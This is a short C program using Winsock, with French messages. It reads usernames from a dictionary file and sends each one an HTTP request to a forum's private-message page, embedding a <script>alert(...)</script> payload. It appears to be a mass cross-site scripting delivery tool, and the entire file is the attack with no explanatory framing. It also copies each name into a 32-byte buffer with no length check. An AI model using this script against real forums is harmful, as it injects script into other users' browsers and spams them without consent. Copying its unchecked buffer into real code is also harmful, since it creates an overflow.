#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>

#define DICO_PATH "dico.txt"
#define HOST "localhost"

int main(int argc,char *argv[])
{
	FILE *in;
	char requete[1024];
        WSADATA wsa;
	SOCKET sock;
	SOCKADDR_IN addr;
	struct hostent *hp;
	char mot[32];
	char c;
	unsigned int i;
	
        
        if(WSAStartup(0x0101,&wsa)!=0)
        {
	    printf("Initialisation de winsock impossible!");
            return 0;
	}
        
	if((hp=gethostbyname(HOST))==0)
	{
            printf("Impossible de trouver %s.\n",HOST);
            return -1;
	}
	
        addr.sin_addr=*((struct in_addr *)hp->h_addr);
	addr.sin_family=AF_INET;
	addr.sin_port=htons(80);
	
	if((sock=socket(AF_INET, SOCK_STREAM, 0))==-1)
	{
		perror("Pb socket()");
		return -1;
	}
	
	if(!(connect(sock,(SOCKADDR*)&addr,sizeof(addr))))
	{
		printf("La connexion a ete etablie.\n");
		if(!(in=fopen(DICO_PATH, "r")))
		{
			printf("Erreur ouverture dico.\n");
			closesocket(sock);
                        WSACleanup();
			return -1;
		}
		i=0;
		while(!feof(in))
		{
			fread(&c,1,1,in);
			if(c=='\n')
			{
				mot[i]='\0';
				i=0;
				sprintf(requete,
					"GET /forum/pv.php?login=%s"
					"&message=<script>alert('bl4h!')</script> HTTP/1.1\n"
					"Host: %s\n"
					"Connection: Keep-Alive\n\n",
					mot,
					HOST);
				send(sock, requete, strlen(requete), 0);
			}
			else
			{
				mot[i]=c;
				i++;
			}
		}
		fclose(in);
		sprintf(requete,"GET / HTTP/1.1\n"
			"Host: %s\n"
			"Connection: close\n\n",
			HOST);
		send(sock,requete,strlen(requete),0);
	}
	closesocket(sock);
	return 0;
}
